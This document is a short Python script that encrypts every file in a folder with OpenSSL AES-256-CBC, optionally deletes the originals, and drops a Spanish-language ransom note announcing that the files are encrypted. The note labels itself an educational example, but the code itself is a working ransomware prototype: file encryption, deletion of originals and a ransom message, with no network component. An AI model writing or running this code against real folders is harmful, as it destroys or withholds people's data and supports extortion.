import argparse
import datetime
import getpass
import os
import subprocess
import sys
from pathlib import Path


def get_password():
    pw = getpass.getpass("Password: ")
    confirm = getpass.getpass("Confirm password: ")
    if pw != confirm:
        print("Passwords do not match.", file=sys.stderr)
        sys.exit(1)
    if not pw:
        print("Password cannot be empty.", file=sys.stderr)
        sys.exit(1)
    return pw


def encrypt_file(path: Path, password: str, delete_original: bool):
    out = path.with_suffix(path.suffix + ".enc")
    cmd = [
        "openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-salt",
        "-pass", f"pass:{password}",
        "-in", str(path),
        "-out", str(out),
    ]
    subprocess.run(cmd, check=True)
    print(f"Encrypted: {path} -> {out}")
    if delete_original:
        path.unlink()


def write_ransom_note(folder: Path):
    note = folder / "LEEME_IMPORTANTE.txt"
    content = f"""\
TUS ARCHIVOS HAN SIDO CIFRADOS

Todos tus archivos en esta carpeta han sido cifrados con AES-256.
Sin la contraseña correcta es imposible recuperarlos.

Para recuperar tus archivos contacta con nosotros (ESTE ES UN EJEMPLO EDUCATIVO).

Fecha del cifrado: {datetime.datetime.now().isoformat()}

[DESCOMPRESION DEMO] Para restaurar los archivos, usa:
    python descifrar.py {folder} --delete
"""
    note.write_text(content, encoding="utf-8")
    print(f"Ransom note created: {note}")


def main():
    parser = argparse.ArgumentParser(description="Encrypt all files in a folder with OpenSSL AES-256-CBC.")
    parser.add_argument("folder", help="Folder containing the files to encrypt")
    parser.add_argument("-d", "--delete", action="store_true", help="Delete the original files after encryption")
    parser.add_argument("-p", "--password", help="Password (if omitted, you will be prompted)")
    args = parser.parse_args()

    folder = Path(args.folder)
    if not folder.is_dir():
        print(f"Not a folder: {folder}", file=sys.stderr)
        sys.exit(1)

    password = args.password if args.password else get_password()

    for path in sorted(folder.iterdir()):
        if path.is_file():
            encrypt_file(path, password, args.delete)

    write_ransom_note(folder)


if __name__ == "__main__":
    main()
